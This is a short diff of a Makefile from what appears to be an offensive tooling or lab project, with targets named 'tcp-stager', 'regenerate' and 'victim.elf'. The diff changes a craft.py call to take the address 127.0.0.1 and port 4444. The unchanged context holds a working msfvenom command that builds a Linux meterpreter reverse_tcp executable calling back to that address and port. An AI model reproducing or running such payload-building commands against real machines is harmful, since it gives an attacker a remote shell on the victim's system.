@@ -23,7 +23,7 @@ tcp-stager:
 	go run main.go
 
 regenerate:
-	python ./victim/craft.py 126
+	python ./victim/craft.py 127.0.0.1 4444 126
 
 victim.elf:
 	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o victim.elf && chmod +x victim.elf
